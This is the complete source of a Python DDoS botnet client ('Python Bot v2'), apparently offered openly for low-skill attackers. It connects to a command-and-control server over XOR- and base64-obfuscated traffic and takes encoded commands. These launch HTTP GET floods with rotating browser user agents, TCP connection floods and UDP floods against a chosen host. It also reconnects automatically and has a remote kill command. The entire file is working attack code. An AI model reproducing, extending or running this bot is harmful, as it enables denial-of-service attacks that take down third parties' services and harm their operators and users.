#!/usr/bin/env python3
#Code By Leeon123

#-- Python Bot version v2 --#
# Added xor encode traffic  #
# Improved dos attack code  #
# New process lock desgin   #
# More easy for the skid    #
#############################
import socket
import sys
import os
import time
import random
import threading
import base64 as b64

cnc   = str("127.0.0.1")#your cnc ip
cport = int(81)#your cnc port
key   = "asdfghjkloiuytresxcvbnmliuytf"
#xor key, don't edit it if u don't know wtf is this#

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",]

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

stop = False
def HTTP(ip, port, path):
	global stop
	while True:
		if stop :
			break
		get_host = "GET "+path+"?"+str(random.randint(0,50000))+" HTTP/1.1\r\nHost: " + ip + "\r\n"
		connection = "Connection: Keep-Alive\r\n"
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
		accept = random.choice(acceptall)
		http = get_host + useragent + accept + connection + "\r\n"
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.connect((str(ip), int(port)))
			for y in range(100):
				s.send(str.encode(http))
			#s.close()
		except:
			s.close()

def CC(ip, port):
	global stop
	while True:
		if stop :
			break
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip),int(port)))
			s.send("\000".encode())
			s.close()
		except:
			s.close()

def UDP(ip, port, size):
	global stop
	while True:
		if stop :
			break
		udpbytes = random._urandom(int(size))
		sendip=(str(ip),int(port))
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		try:
			for y in range(thread):
				s.sendto(udpbytes, sendip)
			s.close()
		except:
			s.close()

def cmdHandle(sock):
	global stop
	attack = 0
	sock.send(xor_enc("1337",key).encode())#login code
	while True:
		tmp = sock.recv(1024).decode()
		if len(tmp) == 0:
			main()
		#print(tmp)
		data = xor_dec(tmp,key)
		if data[0] == '!':
			try:
				command = data.split()
				print(command)
				if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=CC, args=(command[1],command[2]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QBsQEhc=',key):#encoded keywords: !http
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAYAFg==',key):#encoded keywords: !udp
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAQCRc=',key):
					stop = True
					attack = 0#clear attack list
				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
					sys.exit(1)
			except:
				pass
		if data == xor_dec("ERoKAQ==",key):#ping
			sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive

def main():
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
		#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
		#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
		s.connect((cnc,cport))

		cmdHandle(s)

	except Exception as e:
		connect()#magic loop

def connect():
	time.sleep(5)
	main()
#xor enc part#
def xor_enc(string,key):
    lkey=len(key)
    secret=[]
    num=0
    for each in string:
        if num>=lkey:
            num=num%lkey
        secret.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):

    leter = b64.b64decode( string.encode() ).decode()
    lkey=len(key)
    string=[]
    num=0
    for each in leter:
        if num>=lkey:
            num=num%lkey

        string.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return "".join( string )


if __name__ == '__main__':
	main()
